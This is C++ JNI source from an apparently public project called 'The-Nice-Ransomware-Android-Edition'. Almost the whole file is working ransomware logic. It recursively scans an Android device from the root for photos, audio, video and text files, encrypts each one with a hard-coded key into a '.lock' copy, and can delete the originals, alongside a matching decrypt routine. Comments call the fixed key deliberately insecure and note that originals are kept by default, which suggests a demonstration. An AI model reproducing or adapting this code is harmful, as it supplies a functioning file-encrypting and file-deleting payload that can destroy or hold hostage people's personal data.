/*
This file is part of The-Nice-Ransomware-Android-Edition project
https://github.com/agentzex/The-Nice-Ransomware-Android-Edition
 */


#include <jni.h>
#include <cstdio>
#include <string>
#include <iostream>
#include <stdlib.h>
#include <cstring>
#include <fstream>
#include <dirent.h>
#include <stdio.h>
#include <vector>
#include <unistd.h>
#include <sys/types.h>
#include <fstream>
#include <iostream>
#include <cinttypes>
#include <android/log.h>

#include "magiclib.h"



//This isn't secure on purpose
uint8_t MY_KEY[] = "theniceransomwar";
uint8_t IV[] = "0000000000000000";


using namespace std;


vector<string> FILES_TYPES = {"txt", "jpg", "jpeg", "mp3", "mp4", "png", "bmp", "wav", "wave", "flac", "m4a", "tiff", "mov", "aac", "amr", "opus", "flv"};
string EXT = ".lock";
string UNLOCKED_EXT = ".unlocked";

//shitty globals
bool is_encrypt = false;
bool keep_original_file = true; //WARNING: if true - original files will be kept on encryption and locked files will have .unlocked extension on decryption, if false - well, you got the idea...



bool is_needed_file_type(string &file_name){
    for (const auto& f : FILES_TYPES){
        if(file_name.substr(file_name.find_last_of(".") + 1)  == f){
            return true;
        }
    }
    return false;
}


bool is_locked(string &file_name){
    if(file_name.substr(file_name.find_last_of(".") + 1) == "lock"){
        return true;
    }
    return false;
}


void iterateDir(string path, vector<string> &files, bool encrypt){
    DIR *dir;
    struct dirent *drnt;
    if (!(dir = opendir(path.c_str())))
        return;

    while ((drnt = readdir(dir)) != NULL)
    {
        string name(drnt->d_name);
        if (name != "." && name != ".." && name.length() >= 4){
            if (drnt->d_type == DT_DIR) {
                if (strcmp(drnt->d_name, "acct") == 0 || strcmp(drnt->d_name, "sys") == 0 || strcmp(drnt->d_name, "system") == 0 || strcmp(drnt->d_name, "proc") == 0
                    || strcmp(drnt->d_name, "sbin") == 0 || strcmp(drnt->d_name, "dev") == 0){
                    continue;
                }
                string newPath = path + name + "/";
                iterateDir(newPath, files, encrypt);
            }
            else {
                if (encrypt){
                    if (is_needed_file_type(name)){
                        files.push_back(path + name);
                    }
                }
                else {
                    if (is_locked(name)){
                        files.push_back(path + name);
                    }
                }
            }
        }
    }
}


void encrypt_decrypt_ctr(uint8_t *buf, uint32_t &buf_length){
    magic_encrypt(MY_KEY, IV, buf, buf_length);
}


int decrypt(const char *path){
    FILE *in_file = fopen(path, "rb");
    if (!in_file){
        return -2;
    }

    //Get file length
    fseek(in_file, 0, SEEK_END);
    long file_length = ftell(in_file);
    fseek(in_file, 0, SEEK_SET);

    //Allocate memory
    uint8_t *buf = (uint8_t *)malloc(static_cast<size_t>(file_length));
    if (!buf){
        fclose(in_file);
        return -2;
    }

    fread(buf, sizeof(uint8_t), static_cast<size_t>(file_length), in_file);
    fclose(in_file);

    uint32_t buf_length = (uint32_t)file_length;
    encrypt_decrypt_ctr(buf, buf_length);

    string out_path(path);
    out_path = out_path.substr(0, out_path.find_last_of(".")); //removing .lock ext
    if (keep_original_file){ //if we kept original file, we won't override it here, instead we use different ext
        out_path = out_path + UNLOCKED_EXT;
    }

    FILE *out_file = fopen(out_path.c_str(), "wb");
    fwrite(buf, sizeof(uint8_t), buf_length, out_file);
    fclose(out_file);

    free(buf);
    remove(path);  //deleting locked file
    return 0;
}


int encrypt(const char *path){
    if(strstr(path, ".lock") != NULL){ //if ext is  .lock, return
        return -1;
    }

    FILE *in_file = fopen(path, "rb");
    if (!in_file){
        return -2;
    }

    //Get file length
    fseek(in_file, 0, SEEK_END);
    long file_length = ftell(in_file);
    fseek(in_file, 0, SEEK_SET);

    //Allocate memory
    uint8_t *buf = (uint8_t *)malloc(static_cast<size_t>(file_length));
    if (!buf){
        fclose(in_file);
        return -2;
    }

    fread(buf, sizeof(uint8_t), static_cast<size_t>(file_length), in_file);
    fclose(in_file);

    uint32_t buf_length = (uint32_t)file_length;
    encrypt_decrypt_ctr(buf, buf_length);

    string out_path = path + EXT;
    FILE *out_file = fopen(out_path.c_str(), "wb");
    fwrite(buf, sizeof(uint8_t), buf_length, out_file);
    fclose(out_file);

    free(buf);
    if (!keep_original_file){
        remove(path);  //deleting original file
    }
    return 0;
}



extern "C" JNIEXPORT jstring JNICALL
Java_com_zex_TheNiceRansomware_TheNiceRansomwareNDK_initCrypto(JNIEnv *env, jobject instance, jboolean j_keep_original_file, jboolean j_encrypt_or_decrypt) {

    is_encrypt = j_encrypt_or_decrypt;
    keep_original_file = j_keep_original_file;

    int success_encrypted_counter = 0;
    int success_decrypted_counter = 0;
    string output_msg = "";
    vector<string> files;
    iterateDir("/", files, is_encrypt);

    if (is_encrypt){
        for (const auto& v : files){
            if( encrypt(v.c_str()) == 0 ){
                ++success_encrypted_counter;
            }
        }
        output_msg = to_string(success_encrypted_counter) + " of your files have been encrypted by TheNiceRansomware !";
    }
    else {
        for (const auto& v : files){
            if( decrypt(v.c_str()) == 0 ){
                ++success_decrypted_counter;
            }
        }
        output_msg = to_string(success_decrypted_counter) + " of your files have been decrypted by TheNiceRansomware !";
    }

    return env->NewStringUTF(output_msg.c_str());

}